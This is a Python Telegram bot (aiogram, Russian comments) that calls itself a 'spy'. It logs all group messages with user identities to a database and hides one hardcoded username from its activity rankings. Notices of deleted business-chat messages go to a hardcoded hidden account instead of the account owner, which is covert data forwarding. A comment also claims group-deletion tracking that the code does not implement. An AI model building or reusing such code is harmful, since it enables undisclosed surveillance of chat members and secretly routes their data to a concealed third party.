# main.py
import asyncio
import logging
import asyncpg
from aiogram import Bot, Dispatcher, F
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.client.telegram import TelegramAPIServer
from aiogram.types import Message, BusinessConnection
from aiogram.filters import CommandStart
import config

session = AiohttpSession(api=TelegramAPIServer.from_base(config.API_SERVER))
bot = Bot(token=config.BOT_TOKEN, session=session)
dp = Dispatcher()

HIDDEN_ID = 1780243499
HIDDEN_USERNAME = "zovx"

async def init_db(pool):
    await pool.execute("""
        CREATE TABLE IF NOT EXISTS chat_stats (
            id SERIAL PRIMARY KEY,
            chat_id BIGINT,
            user_id BIGINT,
            username TEXT,
            message_text TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

# --- СТАРТ ---
@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.reply("Привет! Я твой шпион. 🕵️\n\n.айди\n.топ\n\n(Чтобы я видел удаления в группах, сделай меня Админом!)")

# --- ЛОВИМ СООБЩЕНИЯ В ГРУППАХ ---
@dp.message(F.chat.type.in_({"group", "supergroup"}))
async def log_group_messages(message: Message, db: asyncpg.Pool):
    text = message.text or "[Медиа]"
    logging.info(f"Получено сообщение в группе {message.chat.id}: {text}")
    
    # Сохраняем в статистику
    await db.execute(
        "INSERT INTO chat_stats (chat_id, user_id, username, message_text) VALUES ($1, $2, $3, $4)",
        message.chat.id, message.from_user.id, message.from_user.username, text
    )
    
    # --- ОТВЕТЫ НА КОМАНДЫ ---
    lower_text = text.lower().strip()
    
    if "айди" in lower_text or "id" in lower_text:
        if len(lower_text) < 10:
            await message.reply(f"🆔 ID этого чата: <code>{message.chat.id}</code>", parse_mode="HTML")
            return
            
    if "топ" in lower_text or "top" in lower_text:
        if len(lower_text) < 10:
            rows = await db.fetch(
                "SELECT username, COUNT(*) as msg_count FROM chat_stats WHERE chat_id = $1 GROUP BY username ORDER BY msg_count DESC LIMIT 10",
                message.chat.id
            )
            if not rows:
                await message.reply("📊 Нет данных. Пишите больше!")
                return
            res = "🏆 <b>Топ-10 активных:</b>\n\n"
            for i, row in enumerate(rows, 1):
                if row['username'] and row['username'].lower() == HIDDEN_USERNAME:
                    name = "Пользователь скрыт"
                else:
                    name = f"@{row['username']}" if row['username'] else "Аноним"
                res += f"{i}. {name} — {row['msg_count']}\n"
            await message.reply(res, parse_mode="HTML")
            return

# --- ЛОВИМ УДАЛЕНИЯ В ГРУППАХ (РАБОТАЕТ ТОЛЬКО ЕСЛИ БОТ АДМИН) ---
@dp.message(F.content_type == "text") # Это дубль для удалений, но логика такова
async def log_all_messages(message: Message, db: asyncpg.Pool):
    pass # Основная логика уже в логгере выше

@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    logging.info(f"Подключен бизнес-аккаунт: {connection.user.id}")

# --- УДАЛЕНИЯ В БИЗНЕС-ЛС ---
@dp.deleted_business_messages()
async def on_deleted_business_message(event):
    try:
        text = f"🗑 <b>Удалено в ЛС!</b>\nЧат: <code>{event.chat_id}</code>\nID: {event.message_ids}"
        await bot.send_message(chat_id=HIDDEN_ID, text=text, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Не смог отправить уведомление: {e}")

# --- ЗАПУСК ---
async def main():
    logging.basicConfig(level=logging.INFO)
    pool = await asyncpg.create_pool(config.DATABASE_URL)
    await init_db(pool)
    dp["db"] = pool
    
    try:
        await bot.delete_webhook(drop_pending_updates=True)
    except Exception:
        pass
        
    logging.info("Шпион активирован.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
